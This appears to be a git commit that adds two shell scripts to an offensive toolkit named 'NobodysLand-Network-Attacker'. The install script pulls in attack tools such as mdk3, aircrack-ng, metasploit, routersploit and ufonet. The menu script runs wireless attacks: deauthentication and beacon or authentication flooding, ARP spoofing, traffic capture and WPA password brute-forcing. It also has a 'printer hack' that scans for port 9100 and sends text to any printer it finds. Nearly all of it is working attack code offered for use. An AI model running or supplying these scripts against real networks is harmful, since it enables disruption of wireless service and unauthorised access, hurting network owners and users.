c0c4578cea780837f94ae58690fca05c8af8c8c6
0Day–At0mik <46066196+MaDatomiKK@users.noreply.github.com>
2019-03-17 09:33:16 +0100

    Add files via upload

---
+++ INSTALL.sh
@@ -0,0 +1,41 @@
+apt-get install figlet
+
+apt-get install lolcat
+
+apt-get install mdk3
+
+apt-get install aircrack-ng
+
+apt-get install git
+
+git clone https://github.com/s0md3v/XSStrike/
+
+apt-get install xterm
+
+apt-get install links
+
+apt-get install driftnet
+
+git clone https://github.com/threat9/routersploit/
+
+git clone https://github.com/epsylon/ufonet/
+
+apt-get install metasploit-framework 
+apt-get install sshpass 
+pip2 install pxssh
+pip2 install impacket
+pip2 install paramiko
+
+clear
+
+echo -e "INSTALL IT AT HOME DIRECTORY"
+
+echo -e "Starting NobodysLand-Network-Attacker"
+
+clear
+
+cd $HOME/NobodysLand/
+
+chmod +x *
+
+./NobodysLand.sh
---
+++ WA.sh
@@ -0,0 +1,122 @@
+cyan='\e[0;36m' 
+green='\033[92m' 
+red='\e[1;31m' 
+yel='\e[0;33m' 
+orange='\e[38;5;166m'
+
+figlet "Wlan"
+figlet "Attacks"
+figlet "Menu"
+
+echo -e $green"========================"
+echo -e $red"1)Deauth Attack"
+echo -e $red"2)Beacon DDoS"
+echo -e $red"3)Auth DDoS"
+echo -e $red"4)TKIP"
+echo -e $red"5)Spoof"
+echo -e $red"6)Passive Attack"
+echo -e $red"7)Brute Force WPA"
+echo -e $red"8)Put Interface In Monitor Mode"
+echo -e $red"9)Explore For Targets"
+echo -e $red"10)Printer Hack"
+echo -e $green"========================"
+
+read -p " [<Attacks>] " attacks 
+if [ $attacks = "1" ] 
+then 
+clear
+figlet "Deauth"
+read -p " [>Interface<] " inter1
+echo -e $green"[+] Starting..."
+mdk3 $inter1 d 
+fi 
+
+if [ $attacks = "2" ] 
+then
+clear
+figlet "Beacon DDoS"
+read -p " [>Interface<] " inter2 
+echo -e $green"[+] Starting..."
+mdk3 $inter2 b 
+fi
+
+if [ $attacks = "3" ] 
+then
+clear
+figlet "Auth DDoS"
+read -p " [>Interface<] " inter3 
+echo -e $green"[+] Starting..."
+mdk3 $inter3 a 
+fi
+
+if [ $attacks = "4" ]
+then
+clear
+figlet "TKIP"
+read -p " [>Interface<] " inter4 
+echo -e $green"[+] Starting..."
+mdk3 $inter4 m 
+fi
+
+if [ $attacks = "5" ] 
+then
+clear
+figlet "Spoof"
+read -p " [>Interface<] " inter5
+echo -e $green"[+] Starting..."
+arpspoof $inter5 
+fi
+
+if [ $attacks = "6" ]
+then
+clear
+figlet "Passive"
+figlet "Attack"
+read -p " [>Interface<] " inter6
+echo -e $green"[+] Starting..." 
+airodump-ng -w data $inter6 
+fi
+
+if [ $attacks = "7" ]
+then
+clear
+figlet "WPA"
+figlet "Brute" 
+read -p " [>Target-BSSID<] " bssid1 
+read -p " [>Wordlist<] " word1
+echo -e $green"[+] Starting..."
+aircrack-ng -b $bssid1 -w $word1  
+fi
+
+if [ $attacks = "8" ] 
+then
+clear
+figlet "Mon0" 
+read -p " [>Interface<] " inter8 
+echo -e $green"[+] Starting..." 
+airmon-ng start $inter8 
+fi
+
+if [ $attacks = "9" ] 
+then
+clear
+figlet "Explore"
+read -p " [>Interface<] " inter9
+echo -e $green"[+] Starting..."
+airodump-ng $inter9 
+fi
+
+#Printer Hack
+
+if [ $attacks = "10" ]
+then
+clear
+sleep 2
+
+figlet "Printer Hack" |lolcat
+sleep 2
+
+read -p " [>Target<] " printer1
+echo "Hacked" | nc $(nmap -T 5 -p 9100 $printer1 --open | grep 'report' | cut -d ' ' -f5) 9100
+
+fi
